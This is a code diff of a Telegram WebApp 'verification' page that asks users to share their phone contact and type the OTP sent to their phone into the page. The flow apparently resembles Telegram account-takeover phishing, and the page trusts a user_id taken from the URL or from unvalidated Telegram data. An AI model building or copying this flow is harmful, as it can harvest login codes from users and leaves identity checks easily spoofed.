@@ -6,27 +6,30 @@
     <title>Telegram Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Keep your existing styles */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; }
-        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 30px 20px; text-align: center; }
-        .header h2 { font-size: 24px; margin-bottom: 5px; }
+        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 25px 20px; text-align: center; }
+        .header h2 { font-size: 24px; margin-bottom: 5px; font-weight: 600; }
         .header p { opacity: 0.9; font-size: 14px; }
-        .content { padding: 30px; }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s ease; }
+        .content { padding: 25px; }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 15px 0; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .error { background: #ff6b6b; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
-        .error.show { display: block; }
-        .success { background: #4CAF50; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
-        .success.show { display: block; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
+        .alert { padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
+        .alert.error { background: #ffebee; color: #d32f2f; border-left: 4px solid #f44336; }
+        .alert.success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #4caf50; }
+        .alert.show { display: block; }
+        .user-card { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center; border: 1px solid #e9ecef; }
+        .user-card h3 { color: #333; margin-bottom: 10px; }
+        .user-card p { color: #666; margin: 5px 0; }
+        .info-box { background: #fff3e0; padding: 18px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid #ff9800; }
+        .info-box ol { margin-left: 20px; margin-top: 10px; }
+        .info-box li { margin-bottom: 8px; color: #555; }
         .hidden { display: none; }
         .loading { text-align: center; padding: 40px 20px; }
-        .loading-spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(0,136,204,0.1); border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .info-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; }
-        .user-info { background: #e8f5e9; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
     </style>
 </head>
 <body>
@@ -37,136 +40,176 @@
         </div>
         
         <div class="content">
-            <!-- Loading Screen -->
-            <div id="loading-screen">
-                <div class="loading">
-                    <div class="loading-spinner"></div>
-                    <p>Loading WebApp...</p>
-                </div>
+            <div id="loading" class="loading">
+                <div class="spinner"></div>
+                <p>Initializing WebApp...</p>
             </div>
             
-            <!-- Main Screen -->
-            <div id="main-screen" class="hidden">
-                <div class="user-info" id="user-info">
-                    <b>👤 User:</b> <span id="user-display">Loading...</span><br>
-                    <b>🤖 Bot:</b> @{{ bot_username }}
+            <div id="main-content" class="hidden">
+                <!-- User Info -->
+                <div class="user-card">
+                    <h3>👤 User Information</h3>
+                    <p><strong>Name:</strong> <span id="user-name">{{ user_display or 'Guest' }}</span></p>
+                    <p><strong>Bot:</strong> @{{ bot_username }}</p>
+                    <p><strong>Status:</strong> <span id="user-status">Ready to verify</span></p>
                 </div>
                 
+                <!-- Alerts -->
+                <div id="alert-error" class="alert error"></div>
+                <div id="alert-success" class="alert success"></div>
+                
+                <!-- Instructions -->
                 <div class="info-box">
-                    <b>How to verify:</b><br><br>
-                    1. Click "Start Verification"<br>
-                    2. Follow instructions<br>
-                    3. Share your contact<br>
-                    4. Receive OTP<br>
-                    5. Enter OTP<br><br>
-                    <small>Your contact will be auto-deleted</small>
+                    <strong>📋 How to verify:</strong>
+                    <ol>
+                        <li>Click "Start Verification" below</li>
+                        <li>Return to Telegram bot chat</li>
+                        <li>Share your phone contact</li>
+                        <li>Receive OTP on your phone</li>
+                        <li>Enter OTP in WebApp</li>
+                    </ol>
+                    <p style="margin-top: 10px; font-size: 12px; color: #777;">
+                        🔒 Your contact will be auto-deleted for privacy
+                    </p>
                 </div>
                 
-                <div class="error" id="error-message"></div>
-                <div class="success" id="success-message"></div>
-                
-                <button class="btn" onclick="startVerification()" id="start-btn">
+                <!-- Action Button -->
+                <button id="start-btn" class="btn" onclick="startVerification()">
                     🚀 Start Verification
                 </button>
                 
-                <!-- Debug info (hidden by default) -->
-                <div id="debug-info" style="display: none; margin-top: 20px; font-size: 12px; color: #666;">
-                    <hr>
-                    <b>Debug Info:</b><br>
-                    User ID: <span id="debug-user-id"></span><br>
-                    Telegram WebApp: <span id="debug-telegram-status"></span>
+                <!-- Debug Info (hidden by default) -->
+                <div id="debug-info" style="margin-top: 20px; padding: 10px; background: #f5f5f5; border-radius: 8px; font-size: 12px; color: #666; display: none;">
+                    <p><strong>Debug Info:</strong></p>
+                    <p>User ID: <span id="debug-user-id">Not detected</span></p>
+                    <p>Session: <span id="debug-session">Checking...</span></p>
+                    <p>Telegram WebApp: <span id="debug-tg">Not detected</span></p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        let tg = null;
-        let userId = null;
+        let userId = "{{ user_id }}";
+        let sessionChecked = false;
         
         document.addEventListener('DOMContentLoaded', function() {
-            console.log("🔧 Initializing WebApp...");
+            console.log("🔧 WebApp initialized");
             
-            // Check if running in Telegram WebApp
-            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-                tg = Telegram.WebApp;
-                tg.ready();
-                tg.expand();
-                
-                console.log("✅ Telegram WebApp initialized");
-                
-                // Get user from Telegram WebApp
-                const tgUser = tg.initDataUnsafe?.user;
-                if (tgUser && tgUser.id) {
-                    userId = tgUser.id.toString();
-                    const userName = tgUser.first_name || tgUser.username || 'User';
+            // Check if we have a user ID
+            if (userId && userId.trim() !== '') {
+                console.log("✅ User ID from server:", userId);
+                checkSession();
+            } else {
+                // Try to get from Telegram WebApp
+                if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+                    const tg = Telegram.WebApp;
+                    tg.ready();
+                    tg.expand();
                     
-                    console.log("✅ User from Telegram:", userName, "ID:", userId);
-                    
-                    // Update UI
-                    document.getElementById('user-display').textContent = userName;
-                    document.getElementById('debug-user-id').textContent = userId;
-                    document.getElementById('debug-telegram-status').textContent = "Active";
-                    
-                    // Show main screen
-                    showMainScreen();
-                    
-                    // Send user ID to server via URL parameter
-                    if (!window.location.search.includes('user_id')) {
-                        const newUrl = window.location.pathname + '?user_id=' + userId;
-                        window.history.replaceState({}, '', newUrl);
+                    const tgUser = tg.initDataUnsafe?.user;
+                    if (tgUser && tgUser.id) {
+                        userId = tgUser.id.toString();
+                        console.log("✅ User from Telegram WebApp:", userId);
+                        
+                        // Update URL with user_id
+                        if (!window.location.search.includes('user_id=')) {
+                            const newUrl = `${window.location.pathname}?user_id=${userId}`;
+                            window.history.replaceState({}, '', newUrl);
+                        }
+                        
+                        // Update display name
+                        const userName = tgUser.first_name || tgUser.username || 'Telegram User';
+                        document.getElementById('user-name').textContent = userName;
+                        
+                        checkSession();
+                    } else {
+                        showError("Please open from Telegram bot using /start command.");
+                        finishLoading();
                     }
                 } else {
-                    // Try to get user from URL
-                    fallbackToUrl();
+                    showError("This WebApp must be opened from Telegram.");
+                    finishLoading();
                 }
-            } else {
-                // Not in Telegram WebApp
-                console.log("⚠️ Not running in Telegram WebApp");
-                document.getElementById('debug-telegram-status').textContent = "Not in Telegram";
-                fallbackToUrl();
             }
+            
+            // Show debug info on triple click
+            let clickCount = 0;
+            document.addEventListener('click', function() {
+                clickCount++;
+                if (clickCount >= 3) {
+                    document.getElementById('debug-info').style.display = 'block';
+                    document.getElementById('debug-user-id').textContent = userId || 'None';
+                    document.getElementById('debug-tg').textContent = 
+                        (typeof Telegram !== 'undefined') ? 'Available' : 'Not available';
+                }
+                setTimeout(() => clickCount = 0, 1000);
+            });
         });
         
-        function fallbackToUrl() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const urlUserId = urlParams.get('user_id');
-            
-            if (urlUserId) {
-                userId = urlUserId;
-                console.log("✅ User from URL:", userId);
-                document.getElementById('user-display').textContent = "User ID: " + userId;
-                document.getElementById('debug-user-id').textContent = userId;
-                showMainScreen();
-            } else {
-                console.log("❌ No user ID found");
-                showError("Please open from Telegram bot using /start command.");
-                document.getElementById('start-btn').disabled = true;
-                document.getElementById('debug-info').style.display = 'block';
-                
-                // Still show main screen
-                setTimeout(() => {
-                    document.getElementById('loading-screen').classList.add('hidden');
-                    document.getElementById('main-screen').classList.remove('hidden');
-                }, 1000);
-            }
+        function finishLoading() {
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('main-content').classList.remove('hidden');
         }
         
-        function showMainScreen() {
-            document.getElementById('loading-screen').classList.add('hidden');
-            document.getElementById('main-screen').classList.remove('hidden');
+        function checkSession() {
+            if (!userId) {
+                showError("User ID not found");
+                finishLoading();
+                return;
+            }
+            
+            // Update debug info
+            document.getElementById('debug-user-id').textContent = userId;
+            
+            // Check session with server
+            fetch('/api/check-session', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log("✅ Session exists:", data);
+                    document.getElementById('debug-session').textContent = 'Active';
+                    document.getElementById('user-status').textContent = 
+                        data.otp_sent ? 'OTP Sent' : 'Ready to verify';
+                    
+                    if (data.otp_sent && data.phone) {
+                        // Redirect to OTP page
+                        setTimeout(() => {
+                            window.location.href = `/otp?user_id=${userId}`;
+                        }, 1000);
+                    }
+                } else {
+                    console.log("⚠️ Session check failed:", data.error);
+                    document.getElementById('debug-session').textContent = 'Not found - will create';
+                }
+                
+                sessionChecked = true;
+                finishLoading();
+            })
+            .catch(error => {
+                console.error("❌ Session check error:", error);
+                document.getElementById('debug-session').textContent = 'Error';
+                sessionChecked = true;
+                finishLoading();
+            });
         }
         
         function startVerification() {
             if (!userId) {
-                showError("User ID not found. Please open from Telegram bot.");
+                showError("Please open from Telegram bot first.");
                 return;
             }
             
-            console.log("Starting verification for user:", userId);
-            showSuccess("Starting verification...");
+            const btn = document.getElementById('start-btn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner" style="width:20px;height:20px;border-width:2px;"></div> Processing...';
             
-            // Call API to start verification
+            showAlert('success', 'Starting verification process...');
+            
             fetch('/api/start-verification', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -175,45 +218,51 @@
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    showSuccess("✅ " + data.message);
+                    showAlert('success', data.message);
                     
                     // Show instructions
                     setTimeout(() => {
                         alert("📋 Instructions:\n\n" + data.instructions);
                         
-                        // Redirect to contact sharing instructions
+                        // Update button
+                        btn.disabled = false;
+                        btn.innerHTML = '✅ Verification Started';
+                        
+                        // Redirect after 2 seconds
                         setTimeout(() => {
                             window.location.href = `/otp?user_id=${userId}`;
                         }, 2000);
-                    }, 1000);
+                    }, 500);
                 } else {
-                    showError("❌ " + data.error);
+                    showAlert('error', data.error || 'Failed to start verification');
+                    btn.disabled = false;
+                    btn.innerHTML = '🚀 Start Verification';
                 }
             })
             .catch(error => {
                 console.error("Error:", error);
-                showError("Failed to start verification");
+                showAlert('error', 'Network error. Please try again.');
+                btn.disabled = false;
+                btn.innerHTML = '🚀 Start Verification';
             });
         }
         
+        function showAlert(type, message) {
+            const alertEl = type === 'error' 
+                ? document.getElementById('alert-error')
+                : document.getElementById('alert-success');
+            
+            alertEl.textContent = message;
+            alertEl.classList.add('show');
+            
+            setTimeout(() => {
+                alertEl.classList.remove('show');
+            }, type === 'error' ? 5000 : 3000);
+        }
+        
         function showError(message) {
-            const errorEl = document.getElementById('error-message');
-            errorEl.textContent = message;
-            errorEl.classList.add('show');
-            setTimeout(() => errorEl.classList.remove('show'), 5000);
+            showAlert('error', message);
         }
-        
-        function showSuccess(message) {
-            const successEl = document.getElementById('success-message');
-            successEl.textContent = message;
-            successEl.classList.add('show');
-            setTimeout(() => successEl.classList.remove('show'), 3000);
-        }
-        
-        // Debug function
-        window.showDebug = function() {
-            document.getElementById('debug-info').style.display = 'block';
-        };
     </script>
 </body>
 </html>
